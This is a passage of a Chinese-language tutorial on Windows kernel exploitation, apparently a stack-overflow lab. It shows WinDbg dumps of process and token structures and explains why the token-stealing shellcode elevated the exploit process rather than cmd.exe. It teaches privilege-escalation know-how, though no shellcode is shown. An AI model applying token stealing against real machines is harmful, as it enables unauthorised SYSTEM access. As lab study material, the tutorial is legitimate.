    ntdll!_EPROCESS
       ...
       +0x0f4 ObjectTable      : 0x8d401b60 _HANDLE_TABLE
       +0x0f8 Token            : _EX_FAST_REF
       +0x0fc WorkingSetPage   : 0
       ...
       +0x2bc TimerResolutionStackRecord : (null) 
    kd> dt _EX_FAST_REF 869eb920+f8
    ntdll!_EX_FAST_REF
       +0x000 Object           : 0x8d4012c6 Void
       +0x000 RefCnt           : 0y110
       +0x000 Value            : 0x8d4012c6
    kd> dt _TOKEN 0x8d4012c0
    nt!_TOKEN
       +0x000 TokenSource      : _TOKEN_SOURCE
       +0x010 TokenId          : _LUID
       +0x018 AuthenticationId : _LUID
       +0x020 ParentTokenId    : _LUID
       +0x028 ExpirationTime   : _LARGE_INTEGER 0x06207526`b64ceb90
       +0x030 TokenLock        : 0x86946490 _ERESOURCE
       +0x034 ModifiedId       : _LUID
       +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
       +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
       +0x074 SessionId        : 0
       +0x078 UserAndGroupCount : 5
       +0x07c RestrictedSidCount : 0
       +0x080 VariableLength   : 0x70
       +0x084 DynamicCharged   : 0x400
       +0x088 DynamicAvailable : 0
       +0x08c DefaultOwnerIndex : 1
       +0x090 UserAndGroups    : 0x8d40149c _SID_AND_ATTRIBUTES
       +0x094 RestrictedSids   : (null) 
       +0x098 PrimaryGroup     : 0x8d401258 Void
       +0x09c DynamicPart      : 0x8d401258  -> 0x101
       +0x0a0 DefaultDacl      : 0x8d401264 _ACL
       +0x0a4 TokenType        : 1 ( TokenPrimary )
       +0x0a8 ImpersonationLevel : 0 ( SecurityAnonymous )
       +0x0ac TokenFlags       : 0x2000
       +0x0b0 TokenInUse       : 0 ''
       +0x0b4 IntegrityLevelIndex : 4
       +0x0b8 MandatoryPolicy  : 1
       +0x0bc LogonSession     : 0x8d401648 _SEP_LOGON_SESSION_REFERENCES
       +0x0c0 OriginatingLogonSession : _LUID
       +0x0c8 SidHash          : _SID_AND_ATTRIBUTES_HASH
       +0x150 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
       +0x1d8 pSecurityAttributes : 0x8d401570 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
       +0x1dc VariablePart     : 0x8d4014c4
查看一下`cmd`进程及其`token`信息
    kd> dt _EPROCESS 99bfc158 ; cmd.exe process
    ntdll!_EPROCESS
       ...
       +0x0f4 ObjectTable      : 0x83205a70 _HANDLE_TABLE
       +0x0f8 Token            : _EX_FAST_REF
       +0x0fc WorkingSetPage   : 0x3549e
       ...
       +0x2bc TimerResolutionStackRecord : (null) 
    kd> dt _EX_FAST_REF 99bfc158+f8
    ntdll!_EX_FAST_REF
       +0x000 Object           : 0xa83f1535 Void
       +0x000 RefCnt           : 0y101
       +0x000 Value            : 0xa83f1535
    kd> dt _TOKEN 0xa83f1530
    nt!_TOKEN
       +0x000 TokenSource      : _TOKEN_SOURCE
       +0x010 TokenId          : _LUID
       +0x018 AuthenticationId : _LUID
       +0x020 ParentTokenId    : _LUID
       +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
       +0x030 TokenLock        : 0x99bfef60 _ERESOURCE
       +0x034 ModifiedId       : _LUID
       +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
       +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
       +0x074 SessionId        : 1
       +0x078 UserAndGroupCount : 0xd
       +0x07c RestrictedSidCount : 0
       +0x080 VariableLength   : 0x198
       +0x084 DynamicCharged   : 0x400
       +0x088 DynamicAvailable : 0
       +0x08c DefaultOwnerIndex : 0
       +0x090 UserAndGroups    : 0xa83f170c _SID_AND_ATTRIBUTES
       +0x094 RestrictedSids   : (null) 
       +0x098 PrimaryGroup     : 0x9cf3c318 Void
       +0x09c DynamicPart      : 0x9cf3c318  -> 0x501
       +0x0a0 DefaultDacl      : 0x9cf3c334 _ACL
       +0x0a4 TokenType        : 1 ( TokenPrimary )
       +0x0a8 ImpersonationLevel : 0 ( SecurityAnonymous )
       +0x0ac TokenFlags       : 0x2a00
       +0x0b0 TokenInUse       : 0x1 ''
       +0x0b4 IntegrityLevelIndex : 0xc
       +0x0b8 MandatoryPolicy  : 3
       +0x0bc LogonSession     : 0x9f3b14c0 _SEP_LOGON_SESSION_REFERENCES
       +0x0c0 OriginatingLogonSession : _LUID
       +0x0c8 SidHash          : _SID_AND_ATTRIBUTES_HASH
       +0x150 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
       +0x1d8 pSecurityAttributes : 0x9aac6f50 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
       +0x1dc VariablePart     : 0xa83f1774
可以发现，我并没有成功替换`cmd`的`token`，但是汇编代码明明完成了`token`替换，为啥没有成功呢，难道真的是`shellcode`的问题吗？
这次下一个断点，一步一步调试`shellcode`
调试到这里，正常我们已经成功替换了`token`，按照上面的步骤再看一下`cmd`的`token`情况，可以发现依然没有提权成功。没有提权成功的原因是因为我们忽视了一个隐含进程`BufferOverflowStack.exe`，来看一下这个进程的信息
    kd> dt _EPROCESS 886e7030 ; BufferOverflowStack.exe process
    ntdll!_EPROCESS
       ...
       +0x0f4 ObjectTable      : 0xa936fba0 _HANDLE_TABLE
       +0x0f8 Token            : _EX_FAST_REF
       +0x0fc WorkingSetPage   : 0x340f7
       ...
       +0x2bc TimerResolutionStackRecord : (null) 
    kd> dt _EX_FAST_REF 886e7030+f8
    ntdll!_EX_FAST_REF
       +0x000 Object           : 0x8d4012c5 Void
       +0x000 RefCnt           : 0y101
       +0x000 Value            : 0x8d4012c5
    kd> dt _TOKEN 0x8d4012c0
    nt!_TOKEN
       +0x000 TokenSource      : _TOKEN_SOURCE
       +0x010 TokenId          : _LUID
       +0x018 AuthenticationId : _LUID
       +0x020 ParentTokenId    : _LUID
       +0x028 ExpirationTime   : _LARGE_INTEGER 0x06207526`b64ceb90
       +0x030 TokenLock        : 0x86946490 _ERESOURCE
       +0x034 ModifiedId       : _LUID
       +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
       +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
       +0x074 SessionId        : 0
       +0x078 UserAndGroupCount : 5
       +0x07c RestrictedSidCount : 0
       +0x080 VariableLength   : 0x70
       +0x084 DynamicCharged   : 0x400
       +0x088 DynamicAvailable : 0
       +0x08c DefaultOwnerIndex : 1
       +0x090 UserAndGroups    : 0x8d40149c _SID_AND_ATTRIBUTES
       +0x094 RestrictedSids   : (null) 
       +0x098 PrimaryGroup     : 0x8d401258 Void
       +0x09c DynamicPart      : 0x8d401258  -> 0x101
       +0x0a0 DefaultDacl      : 0x8d401264 _ACL
       +0x0a4 TokenType        : 1 ( TokenPrimary )
       +0x0a8 ImpersonationLevel : 0 ( SecurityAnonymous )
       +0x0ac TokenFlags       : 0x2000
       +0x0b0 TokenInUse       : 0x1 ''
       +0x0b4 IntegrityLevelIndex : 4
       +0x0b8 MandatoryPolicy  : 1
       +0x0bc LogonSession     : 0x8d401648 _SEP_LOGON_SESSION_REFERENCES
       +0x0c0 OriginatingLogonSession : _LUID
       +0x0c8 SidHash          : _SID_AND_ATTRIBUTES_HASH
       +0x150 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
       +0x1d8 pSecurityAttributes : 0x8d401570 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
       +0x1dc VariablePart     : 0x8d4014c4
      kd> !token 0x8d4012c0
    _TOKEN 0xffffffff8d4012c0
    TS Session ID: 0
    User: S-1-5-18
    User Groups: 
     00 S-1-5-32-544
        Attributes - Default Enabled Owner 
     01 S-1-1-0
        Attributes - Mandatory Default Enabled 
     02 S-1-5-11
        Attributes - Mandatory Default Enabled 
     03 S-1-16-16384
        Attributes - GroupIntegrity GroupIntegrityEnabled 
    Primary Group: S-1-5-18
    Privs: 
     02 0x000000002 SeCreateTokenPrivilege            Attributes - 
     03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - 
     04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default 
     05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - 
     07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default 
     08 0x000000008 SeSecurityPrivilege               Attributes - 
     09 0x000000009 SeTakeOwnershipPrivilege          Attributes - 
     10 0x00000000a SeLoadDriverPrivilege             Attributes - 
     11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default 
     12 0x00000000c SeSystemtimePrivilege             Attributes - 
     13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default 
     14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default 
     15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default 
     16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default 
     17 0x000000011 SeBackupPrivilege                 Attributes - 
     18 0x000000012 SeRestorePrivilege                Attributes - 
     19 0x000000013 SeShutdownPrivilege               Attributes - 